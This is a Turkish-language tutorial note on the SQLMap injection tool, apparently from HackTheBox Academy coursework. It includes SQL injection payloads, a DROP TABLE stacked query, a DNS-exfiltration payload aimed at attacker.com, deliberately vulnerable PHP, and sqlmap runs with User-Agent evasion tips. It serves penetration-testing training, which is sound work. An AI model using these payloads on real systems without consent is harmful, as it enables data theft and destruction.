---
{"dg-publish":true,"permalink":"/web-penters/sqlmap/"}
---


```shell-session
M1R4CKCK@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```


SQLMap güçlü bir algılama motoru, çok sayıda özellik ve birçok yönünü ince ayarlamak için çok çeşitli seçenekler ve anahtarlarla birlikte gelir:

![Pasted image 20241214035529.png](/img/user/resimler/Pasted%20image%2020241214035529.png)


## SQLMap Installation

```shell-session
$ sudo apt install sqlmap
```

Eğer manuel olarak kurulum yapmak istiyorsak Linux terminalinde ya da Windows komut satırında aşağıdaki komutu kullanabiliriz:

```shell-session
$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

```shell-session
$ python sqlmap.py
```


## Supported Databases

SQLMap, diğer SQL exploitation araçları arasında DBMS'ler için en geniş desteğe sahiptir. SQLMap aşağıdaki DBMS'leri tam olarak desteklemektedir:

|   |   |   |   |
|---|---|---|---|
|`MySQL`|`Oracle`|`PostgreSQL`|`Microsoft SQL Server`|
|`SQLite`|`IBM DB2`|`Microsoft Access`|`Firebird`|
|`Sybase`|`SAP MaxDB`|`Informix`|`MariaDB`|
|`HSQLDB`|`CockroachDB`|`TiDB`|`MemSQL`|
|`H2`|`MonetDB`|`Apache Derby`|`Amazon Redshift`|
|`Vertica`, `Mckoi`|`Presto`|`Altibase`|`MimerSQL`|
|`CrateDB`|`Greenplum`|`Drizzle`|`Apache Ignite`|
|`Cubrid`|`InterSystems Cache`|`IRIS`|`eXtremeDB`|
|`FrontBase`||||

SQLMap ekibi ayrıca periyodik olarak yeni DBMS'ler eklemek ve desteklemek için çalışmaktadır.


### Desteklenen SQL Enjeksiyon Türleri

SQLMap, bilinen tüm SQLi türlerini düzgün bir şekilde tespit edebilen ve exploit edebilen tek sızma testi aracıdır. SQLMap tarafından desteklenen SQL enjeksiyon türlerini sqlmap -hh komutu ile görüyoruz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

==BEUSTQ== teknik karakterleri aşağıdakileri ifade eder:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries


## Boolean-based blind SQL Injection

Boolean-based blind SQL Injection örneği:

```sql
AND 1=1
```

SQLMap, TRUE ile FALSE sorgu sonuçlarını ayırt ederek Boolean based blind SQL Injection güvenlik açıklarından faydalanır ve istek başına 1 bayt bilgiyi etkin bir şekilde alır. Farklılaştırma, SQL sorgusunun TRUE veya FALSE döndürüp döndürmediğini belirlemek için sunucu yanıtlarını karşılaştırmaya dayanır. Bu, ham yanıt içeriği, HTTP kodları, sayfa başlıkları, filtrelenmiş metin ve diğer faktörlerin fuzzy karşılaştırmaları arasında değişir.

* TRUE sonuçları genellikle normal sunucu yanıtıyla arasında hiç fark olmayan veya marjinal fark olan yanıtlara dayanır.

* FALSE sonuçları, normal sunucu yanıtından önemli farklılıkları olan yanıtlara dayanır.

* Boolean tabanlı blind SQL Injection, web uygulamalarında en yaygın SQLi türü olarak kabul edilir.


## Error-based SQL Injection

Error-based SQL Injection örneği:

```sql
AND GTID_SUBSET(@@version,0)
```

Eğer database management system (DBMS) ile ilgili sorunlar sonucunda oluşan errors, server response içerisinde yer alıyorsa, bu errors istenilen queries sonuçlarını taşımak için kullanılabilir. Bu durumlarda, mevcut DBMS için özel hazırlanmış payloads kullanılır ve bilinen misbehaviors'a neden olan functions hedeflenir. SQLMap, bu tür payloads için en kapsamlı listeye sahiptir ve aşağıdaki DBMS'ler için error-based SQL injection'ı destekler.

|   |   |   |
|---|---|---|
|MySQL|PostgreSQL|Oracle|
|Microsoft SQL Server|Sybase|Vertica|
|IBM DB2|Firebird|MonetDB|

Error-based SQLi, UNION query-based hariç diğer tüm türlerden daha hızlı olarak kabul edilir, çünkü her istekte “chunks” adı verilen sınırlı miktarda (örneğin 200 bayt) veri alabilir.


## UNION query-based

UNION Query Based SQL Injection örneği:

```sql
UNION ALL SELECT 1,@@version,3
```

UNION kullanımıyla, orijinal (savunmasız) sorguyu enjekte edilen ifadelerin sonuçlarıyla genişletmek genellikle mümkündür. Bu şekilde, orijinal sorgu sonuçları yanıtın bir parçası olarak işlenirse, saldırgan sayfa yanıtı içinde enjekte edilen ifadelerden ek sonuçlar alabilir. Bu tür SQL enjeksiyonu en hızlısı olarak kabul edilir, çünkü ideal senaryoda saldırgan tek bir istekle ilgili tüm veritabanı tablosunun içeriğini çekebilir.


## Stacked queries

Example of `Stacked Queries`:

```sql
; DROP TABLE users
```


“Piggy-backing” olarak da bilinen SQL sorgularının stacking'i, güvenlik açığı olan SQL sorgusundan sonra ek SQL sorgularının enjekte edilmesidir. Sorgu olmayan ifadelerin (örneğin INSERT, UPDATE veya DELETE) çalıştırılması için bir gereksinim olması durumunda, stacking savunmasız platform tarafından desteklenmelidir (örneğin, Microsoft SQL Server ve PostgreSQL varsayılan olarak bunu destekler). SQLMap, gelişmiş özelliklerde (örn. işletim sistemi komutlarının yürütülmesi) yürütülen sorgu dışı ifadeleri çalıştırmak ve blind time-based SQLi türlerine benzer şekilde veri almak için bu tür güvenlik açıklarını kullanabilir.


## Time-based blind SQL Injection

Example of `Time-based blind SQL Injection`:

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

Time-based blind SQL Enjeksiyonunun prensibi Boolean based blind SQL Enjeksiyonuna benzer, ancak burada yanıt süresi TRUE veya FALSE arasındaki ayrım için kaynak olarak kullanılır.

* TRUE yanıtı genellikle normal sunucu yanıtına kıyasla yanıt süresinde gözle görülür bir farkla karakterize edilir

* FALSE yanıtı, normal yanıt sürelerinden ayırt edilemeyecek bir yanıt süresiyle sonuçlanmalıdır

Time-based blind SQL Enjeksiyonu, TRUE ile sonuçlanan sorgular sunucu yanıtını geciktireceğinden, boolean tabanlı blind SQLi'den önemli ölçüde daha yavaştır. Bu SQLi türü, Boolean tabanlı blind SQL Injection'ın uygulanamadığı durumlarda kullanılır. Örneğin, savunmasız SQL deyiminin sorgu olmayan (örneğin INSERT, UPDATE veya DELETE), sayfa oluşturma işlemine herhangi bir etkisi olmayan yardımcı fonksiyonun bir parçası olarak yürütülmesi durumunda, Boolean tabanlı blind SQL Injection bu durumda gerçekten işe yaramayacağından, time-based SQLi gereklilik dışında kullanılır.


### Inline queries (Satır içi sorgular)

```sql
SELECT (SELECT @@version) from
```

Bu tür bir enjeksiyon, orijinal sorgunun içine bir sorgu yerleştirmiştir. Bu tür bir SQL enjeksiyonu nadirdir, çünkü savunmasız web uygulamasının belirli bir şekilde yazılması gerekir. Yine de, SQLMap bu tür SQLi de desteklemektedir.


## Out-of-band SQL Injection

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Bu, en gelişmiş SQLi türlerinden biri olarak kabul edilir ve diğer tüm türlerin savunmasız web uygulaması tarafından desteklenmediği veya çok yavaş olduğu durumlarda kullanılır (örneğin, time-based blind SQLi). SQLMap, istenen sorguların DNS trafiği aracılığıyla alındığı “DNS exfiltration” yoluyla out-of-band SQLi'yi destekler.

SQLMap, kontrol altındaki domain (örn. .attacker.com) için DNS sunucusunda SQLMap'i çalıştırarak, sunucuyu var olmayan subdomainleri (örn. foo.attacker.com) talep etmeye zorlayarak saldırıyı gerçekleştirebilir; burada foo, almak istediğimiz SQL yanıtı olacaktır. SQLMap daha sonra bu hatalı DNS isteklerini toplayabilir ve SQL yanıtının tamamını oluşturmak için foo kısmını toplayabilir.


Soru :  What's the fastest SQLi type?

Cevap : UNION query-based


### SQLMap ile Başlarken


```shell-session
sqlmap -h
```

```shell-session
sqlmap -hh
```

Daha fazla ayrıntı için, SQLMap'in resmi kullanım kılavuzunu temsil ettiğinden, kullanıcıların projenin [wiki'sine](https://github.com/sqlmapproject/sqlmap/wiki/Usage) başvurmaları önerilir.


## Basic Scenario
Basit bir senaryoda, bir sızma testi uzmanı, bir GET parametresi (ör. id) aracılığıyla kullanıcı girdisini kabul eden web sayfasına erişir. Daha sonra web sayfasının SQL enjeksiyonu güvenlik açığından etkilenip etkilenmediğini test etmek isterler. Eğer öyleyse, bunu istismar etmek, back-end veritabanından mümkün olduğunca çok bilgi almak ve hatta altta yatan dosya sistemine erişmeye ve işletim sistemi komutlarını çalıştırmaya çalışmak isteyeceklerdir. Bu senaryo için örnek bir SQLi zafiyetli PHP kodu aşağıdaki gibi görünecektir:

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

[[Kod açıklması php 3 \|Kod açıklması php 3 ]]

Güvenlik açığı bulunan SQL sorgusu için hata raporlama etkinleştirildiğinden, herhangi bir SQL sorgusu yürütme sorunu olması durumunda web sunucusu yanıtının bir parçası olarak bir veritabanı hatası döndürülecektir. Bu tür durumlar, ortaya çıkan hatalar kolayca fark edilebildiğinden, özellikle manuel parametre değeri kurcalanması durumunda SQLi tespit sürecini kolaylaştırır:

![Pasted image 20241214042757.png](/img/user/resimler/Pasted%20image%2020241214042757.png)

http://www.example.com/vuln.php?id=1 örnek URL'sinde bulunan bu örneğe karşı SQLMap'i çalıştırmak için aşağıdaki gibi görünecektir:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 22:26:45 /2020-09-09/

[22:26:45] [INFO] testing connection to the target URL
[22:26:45] [INFO] testing if the target URL content is stable
[22:26:46] [INFO] target URL content is stable
[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
[22:26:46] [INFO] GET parameter 'id' appears to be dynamic
[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:26:46] [WARNING] reflective value(s) found and filtering out
[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
[22:26:46] [INFO] testing 'Generic inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
...SNIP...
[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[22:26:46] [INFO] testing 'MySQL inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                       
...SNIP...
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:26:56] [INFO] target URL appears to have 3 columns in query
[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
---
[22:26:56] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'

[*] ending @ 22:26:57 /2020-09-09/
```

SQLMap'teki **`--batch`** parametresi, aracı tam otomatik modda çalıştırmaya yarar. Bu parametre, SQLMap'in çalışması sırasında kullanıcıdan herhangi bir onay veya ek bilgi istememesini sağlar.

### **Detaylı Açıklama:**

Normalde SQLMap, saldırı sırasında bazı durumlarda kullanıcıya sorular sorabilir, örneğin:

- Hangi veritabanı motorunun hedeflendiğini onaylama.
- Belirli bir saldırı tekniği seçme (örneğin: union-based, error-based vb.).
- Hassas işlemler için devam edip etmeme (örneğin: veritabanı silme riskine karşı uyarılar).

**`--batch`** kullanıldığında:

- SQLMap tüm bu soruları otomatik olarak varsayılan yanıtlarla geçer.
- Kullanıcı etkileşimine gerek kalmadan saldırıyı yürütür.

### **Ne Zaman Kullanılır?**

- Tam otomasyon gerektiğinde.
- Araç komut dosyaları (scripts) içinde SQLMap kullanılırken.
- Uzun test süreçlerinde, sürekli etkileşimden kaçınmak için.

### **Kısaca:**

**`--batch`**, SQLMap'in tüm işlemleri varsayılan değerlerle otomatik olarak gerçekleştirmesini sağlar. Kullanıcıdan onay istemez.


### SQLMap Çıktı Açıklaması

SQLMap çıktısı, tarama sırasında güvenlik açıkları ve kullanılan teknikler hakkında bilgi verir. Bu bilgiler, enjeksiyon türünü ve savunmasız parametreyi anlamamıza yardımcı olur. Böylece, web uygulamasını manuel olarak istismar etmek istediğimizde rehberlik sağlar.


### Log Mesajları Açıklama


#### URL content is stable (URL içeriği sabittir)

`Log Message:`

- "target URL content is stable"

Bu, sürekli aynı talepler olması durumunda yanıtlar arasında büyük değişiklikler olmadığı anlamına gelir. Bu, otomasyon açısından önemlidir, çünkü istikrarlı yanıtlar durumunda, potansiyel SQLi girişimlerinin neden olduğu farklılıkları tespit etmek daha kolaydır. Kararlılık önemli olsa da, SQLMap potansiyel olarak kararsız hedeflerden gelebilecek potansiyel “gürültüyü” otomatik olarak ortadan kaldırmak için gelişmiş mekanizmalara sahiptir.


#### Parameter appears to be dynamic (Parametre dinamik görünüyor)

`Log Message:`

- "GET parameter 'id' appears to be dynamic"

Test edilen parametrenin her zaman “dinamik” olması istenir, çünkü değerinde yapılan herhangi bir değişikliğin yanıtta bir değişikliğe neden olacağının bir işaretidir; bu nedenle parametre bir veritabanına bağlanabilir. Çıktının “statik” olması ve değişmemesi durumunda, test edilen parametrenin değerinin en azından mevcut bağlamda hedef tarafından işlenmediğinin bir göstergesi olabilir.


#### Parameter might be injectable (Parametre enjekte edilebilir olabilir)

`Log Message:` "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"

Daha önce tartışıldığı gibi, DBMS hataları potansiyel SQLi için iyi bir göstergedir. Bu durumda, SQLMap kasıtlı olarak geçersiz bir değer gönderdiğinde (örneğin ?id=1”,)...))') bir MySQL hatası vardı, bu da test edilen parametrenin SQLi enjekte edilebilir olabileceğini ve hedefin MySQL olabileceğini gösterir. Bunun SQLi'nin kanıtı olmadığı, sadece tespit mekanizmasının sonraki çalıştırmada kanıtlanması gerektiğinin bir göstergesi olduğu unutulmamalıdır.


#### Parameter might be vulnerable to XSS attacks (Parametre XSS saldırılarına karşı savunmasız olabilir)

`Log Message:`

- "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"

Birincil amacı bu olmasa da, SQLMap ayrıca bir XSS güvenlik açığının varlığı için hızlı bir sezgisel test çalıştırır. SQLMap ile çok sayıda parametrenin test edildiği büyük ölçekli testlerde, özellikle SQLi güvenlik açığı bulunmazsa, bu tür hızlı sezgisel kontrollere sahip olmak güzeldir.



#### Back-end DBMS is '...

`Log Message:`

- "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"

Normal bir çalıştırmada SQLMap desteklenen tüm DBMS'leri test eder. Hedefin belirli bir DBMS kullandığına dair açık bir gösterge olması durumunda, payloadları yalnızca belirli DBMS'ye daraltabiliriz.


#### Level/risk values

`Log Message:`

- "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"

Hedefin belirli bir DBMS kullandığına dair açık bir gösterge varsa, aynı belirli DBMS için testleri normal testlerin ötesine genişletmek de mümkündür.
Bu, temel olarak söz konusu DBMS için tüm SQL enjeksiyon payload'larının çalıştırılması anlamına gelirken, hiçbir DBMS tespit edilmediğinde yalnızca üst payload'lar test edilecektir.


#### Reflective values found

`Log Message:`

- "reflective value(s) found and filtering out"

Sadece kullanılan payloadların parçalarının yanıtta bulunduğuna dair bir uyarı. Bu davranış, gereksiz öğeleri temsil ettiği için otomasyon araçlarında sorunlara neden olabilir. Ancak SQLMap, orijinal sayfa içeriğini karşılaştırmadan önce bu tür gereksiz öğeleri kaldırmak için filtreleme mekanizmalarına sahiptir.



#### Parameter appears to be injectable (Parametre enjekte edilebilir gibi görünüyor)

`Log Message:`

- "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"

Bu mesaj, parametrenin enjekte edilebilir göründüğünü, ancak yine de yanlış pozitif bir bulgu olma ihtimalinin bulunduğunu gösterir. Boolean based blind ve benzeri SQLi türlerinde (örn. time-based blind), yanlış-pozitif olasılığının yüksek olduğu durumlarda, çalıştırmanın sonunda SQLMap, yanlış-pozitif bulguların giderilmesi için basit mantık kontrollerinden oluşan kapsamlı testler gerçekleştirir.

Ek olarak, --string=“luther” ile SQLMap'in TRUE ile FALSE yanıtlarını ayırt etmek için yanıtta sabit string değeri luther'in görünümünü tanıdığını ve kullandığını gösterir. Bu önemli bir bulgudur çünkü bu gibi durumlarda, dinamiklik/refleksiyon giderme veya yanıtların fuzzy karşılaştırması gibi gelişmiş dahili mekanizmaların kullanılmasına gerek yoktur ve bunlar yanlış-pozitif olarak değerlendirilemez.


#### Time-based comparison statistical model (Zamana dayalı karşılaştırma istatistiksel modeli)

`Log Message:`

- "time-based comparison requires a larger statistical model, please wait........... (done)"

SQLMap, düzenli ve (kasıtlı olarak) gecikmeli hedef yanıtlarının tanınması için istatistiksel bir model kullanır. Bu modelin çalışması için yeterli sayıda düzenli yanıt süresinin toplanması gerekmektedir. Bu şekilde SQLMap, yüksek gecikmeli ağ ortamlarında bile kasıtlı gecikmeyi istatistiksel olarak ayırt edebilir.


#### Extending UNION query injection technique tests (UNION sorgu enjeksiyon tekniği testlerini genişletme)

`Log Message:`

- "automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"

UNION-query SQLi kontrolleri, kullanılabilir payload'un başarılı bir şekilde tanınması için diğer SQLi türlerine göre çok daha fazla istek gerektirir. Parametre başına test süresini azaltmak için, özellikle hedef enjekte edilebilir görünmüyorsa, bu tür bir kontrol için istek sayısı sabit bir değerle (yani 10) sınırlandırılır. Bununla birlikte, hedefin savunmasız olma ihtimali yüksekse, özellikle başka bir (potansiyel) SQLi tekniği bulunduğunda, SQLMap daha yüksek başarı beklentisi nedeniyle UNION sorgusu SQLi için varsayılan istek sayısını artırır.


#### Technique appears to be usable (Teknik kullanılabilir görünüyor)

`Log Message:`

- "ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"

UNION sorgusu SQLi türü için sezgisel bir kontrol olarak, gerçek UNION payloadları gönderilmeden önce ORDER BY olarak bilinen bir teknik kullanılabilirlik açısından kontrol edilir. Kullanılabilir olması durumunda SQLMap, binary-search yaklaşımını uygulayarak gerekli UNION sütunlarının doğru sayısını hızlı bir şekilde tanıyabilir.


Bunun, güvenlik açığı bulunan sorgudaki etkilenen tabloya bağlı olduğunu unutmayın.



#### Parameter is vulnerable

`Log Message:`

- "GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"

Bu, SQLMap'in en önemli mesajlarından biridir, çünkü parametrenin SQL enjeksiyonlarına karşı savunmasız olduğu anlamına gelir. Normal durumlarda, kullanıcı sadece hedefe karşı kullanılabilecek en az bir enjeksiyon noktası (yani parametre) bulmak isteyebilir. Ancak, web uygulaması üzerinde kapsamlı bir test yürütüyorsak ve tüm olası güvenlik açıklarını bildirmek istiyorsak, tüm güvenlik açığı olan parametreleri aramaya devam edebiliriz.


#### Sqlmap identified injection points (Sqlmap enjeksiyon noktalarını belirledi)

`Log Message:`

- "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"

Ardından, bulunan SQLi güvenlik açıklarının başarılı bir şekilde tespit edildiğinin ve istismar edildiğinin nihai kanıtını temsil eden tüm enjeksiyon noktalarının türü, başlığı ve payload'ları ile birlikte bir listesi yer almaktadır. SQLMap'in yalnızca kanıtlanabilir şekilde istismar edilebilir (yani kullanılabilir) bulguları listelediğine dikkat edilmelidir.


#### Data logged to text files

`Log Message:`

- "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"

Bu, belirli bir hedef için tüm logları, oturumları ve çıktı verilerini depolamak için kullanılan lokal dosya sistemi konumunu gösterir - bu durumda, www.example.com. Enjeksiyon noktasının başarıyla tespit edildiği böyle bir ilk çalıştırmadan sonra, gelecekteki çalıştırmalar için tüm ayrıntılar aynı dizinin oturum dosyalarında saklanır. Bu, SQLMap'in oturum dosyalarının verilerine bağlı olarak gerekli hedef isteklerini mümkün olduğunca azaltmaya çalıştığı anlamına gelir.



### HTTP İsteği Üzerinde SQLMap Çalıştırma

SQLMap, kullanımından önce (HTTP) isteğini düzgün bir şekilde ayarlamak için kullanılabilecek çok sayıda seçenek ve anahtara sahiptir.

Çoğu durumda, uygun cookie değerlerini sağlamayı unutmak, uzun bir komut satırıyla kurulumu aşırı karmaşıklaştırmak veya biçimlendirilmiş POST verilerinin yanlış bildirimi gibi basit hatalar, potansiyel SQLi güvenlik açığının doğru bir şekilde tespit edilmesini ve kullanılmasını önleyecektir.


## Curl Commands

Bir SQLMap isteğini belirli bir hedefe (yani, içinde parametreler bulunan web isteğine) karşı düzgün bir şekilde ayarlamanın en iyi ve en kolay yollarından biri, Chrome, Edge veya Firefox Developer Tools içindeki Network (Monitor) panelinden Copy as cURL özelliğini kullanmaktır:


![Pasted image 20241214153628.png](/img/user/resimler/Pasted%20image%2020241214153628.png)


Clipboard içeriğini (Ctrl-V) komut satırına yapıştırarak ve orijinal curl komutunu sqlmap olarak değiştirerek, SQLMap'i aynı curl komutuyla kullanabiliyoruz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

SQLMap'e test için veri sağlarken, SQLi güvenlik açığı için değerlendirilebilecek bir parametre değeri veya otomatik parametre bulma için özel seçenekler/anahtarlar (örneğin --crawl, --forms veya -g) olmalıdır.


## GET/POST Requests

En yaygın senaryoda, GET parametreleri önceki örnekte olduğu gibi -u/--url seçeneği kullanılarak sağlanır. POST verilerini test etmek için ise aşağıdaki gibi --data bayrağı kullanılabilir:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

Bu gibi durumlarda, POST parametreleri uid ve name SQLi güvenlik açığı için test edilecektir. Örneğin, uid parametresinin bir SQLi güvenlik açığına eğilimli olduğuna dair net bir göstergeye sahipsek, -p uid kullanarak testleri yalnızca bu parametreye daraltabiliriz. Aksi takdirde, aşağıdaki gibi özel pointer * kullanarak sağlanan verilerin içindeki işaretleyebiliriz:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```


## Full HTTP Requests

Çok sayıda farklı başlık değeri ve uzun bir POST gövdesi içeren karmaşık bir HTTP isteği belirtmemiz gerekiyorsa, -r bayrağını kullanabiliriz. Bu seçenekle SQLMap, tüm HTTP isteğini tek bir metin dosyası içinde içeren “ request file” ile sağlanır. Yaygın bir senaryoda, bu tür bir HTTP isteği özel bir proxy uygulamasından (örneğin Burp) yakalanabilir ve aşağıdaki gibi istek dosyasına yazılabilir:

![Pasted image 20241214171020.png](/img/user/resimler/Pasted%20image%2020241214171020.png)

Burp ile yakalanan bir HTTP isteği örneği aşağıdaki gibi görünecektir:

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

HTTP isteğini Burp içinden manuel olarak kopyalayıp bir dosyaya yazabilir ya da Burp içinde isteğe sağ tıklayıp Copy to file (Dosyaya kopyala) seçeneğini seçebiliriz. HTTP isteğinin tamamını yakalamanın bir başka yolu da bölümde daha önce bahsedildiği gibi tarayıcıyı kullanmak ve Copy > Copy Request Headers seçeneğini seçmek ve ardından isteği bir dosyaya yapıştırmaktır.

SQLMap'i bir HTTP istek dosyası ile çalıştırmak için aşağıdaki gibi -r bayrağını kullanırız:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 14:32:59 /2020-09-11/

[14:32:59] [INFO] parsing HTTP request from 'req.txt'
[14:32:59] [INFO] testing connection to the target URL
[14:32:59] [INFO] testing if the target URL content is stable
[14:33:00] [INFO] target URL content is stable
```

İpucu: '--data' seçeneğinde olduğu gibi, kaydedilen istek dosyasında da enjekte etmek istediğimiz parametreyi `'/?id=*'` gibi bir yıldız işaretiyle `(*)` belirtebiliriz.


### Custom SQLMap Talepleri

Karmaşık istekleri manuel olarak oluşturmak istersek, SQLMap'e ince ayar yapmak için çok sayıda anahtar ve seçenek vardır.

Örneğin, (oturum) cookie değerinin PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c olarak belirtilmesi gerekiyorsa --cookie seçeneği aşağıdaki gibi kullanılır:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Aynı etki -H/--header seçeneği kullanılarak da yapılabilir:

```shell-session
M1R4CKCK@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Aynı HTTP başlıklarının değerlerini belirtmek için kullanılan --host, --referer ve -A/--user-agent gibi seçenekler için de aynı şeyi uygulayabiliriz.

Ayrıca, normal tarayıcı değerlerinden oluşan veritabanından rastgele bir User-agent başlık değeri seçmek için tasarlanmış bir --random-agent anahtarı vardır. Giderek daha fazla koruma çözümü tanınabilir varsayılan SQLMap User-agent değerini içeren tüm HTTP trafiğini otomatik olarak düşürdüğünden (örneğin User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)) bu hatırlanması gereken önemli bir anahtardır. Alternatif olarak, aynı başlık değerini kullanarak akıllı telefonu taklit etmek için --mobile anahtarı kullanılabilir.

